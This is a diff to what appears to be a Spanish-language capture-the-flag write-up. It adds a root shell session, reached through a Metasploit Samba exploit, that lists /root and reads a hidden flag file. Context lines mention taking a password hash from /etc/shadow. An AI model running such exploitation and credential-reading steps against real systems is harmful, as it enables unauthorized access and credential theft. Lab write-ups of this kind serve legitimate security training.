@@ -485,6 +485,25 @@ msf6 exploit(linux/samba/is_known_pipename) > exploit
 
 Ejecutamos el exploit y ya estamos dentro.
 
+ls -la
+total 36
+drwx------  4 root root 4096 Apr  9 15:24 .
+drwxr-xr-x 22 root root 4096 Apr  8 23:51 ..
+lrwxrwxrwx  1 root root    9 Nov  3 12:56 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3744 Apr  9 17:08 .bashrc
+drwx------  3 root root 4096 Apr  8 23:02 .cache
+drwxr-xr-x  2 root root 4096 Apr  8 22:53 .pip
+-rw-r--r--  1 root root  140 Feb 20  2014 .profile
+-rw-------  1 root root 1024 Apr  5 13:13 .rnd
+----------  1 root root   23 Nov  3 13:41 .s3cr3t
+-rw-------  1 root root  629 Nov  3 14:10 .viminfo
+cd .s3cr3t
+/bin/sh: 367: cd: can't cd to .s3cr3t
+cat .s3cr3t
+GFCS|C0d3-S3cr3t-R00t|
+
+
+
 ~ Task 11 ~
 
 Cogemos el hash de guakamole que se encuentra en /etc/shadow
